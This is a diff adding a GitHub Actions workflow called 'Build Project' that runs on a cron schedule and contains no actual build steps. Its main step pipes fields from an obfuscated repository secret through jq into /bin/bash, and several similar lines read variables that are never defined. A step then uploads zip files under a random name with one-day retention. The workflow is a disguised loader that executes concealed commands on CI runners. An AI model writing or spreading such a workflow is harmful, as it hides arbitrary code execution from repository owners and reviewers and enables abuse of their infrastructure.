@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 1,7,13,19 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          id0161: ${{ secrets.id0161 }}
+        run: |
+          printf '%s' "$id0161" | jq -r .ic780 | /bin/bash
+          printf '%s' "$k8" | jq -r .apz47 | /bin/bash
+          printf '%s' "$ttkgj0" | jq -r .voj875 | /bin/bash
+          printf '%s' "$un7" | jq -r .gfn516 | /bin/bash
+          printf '%s' "$d07" | jq -r .a35157 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: DNj98pXa
+          path: "*.zip"
+          retention-days: 1
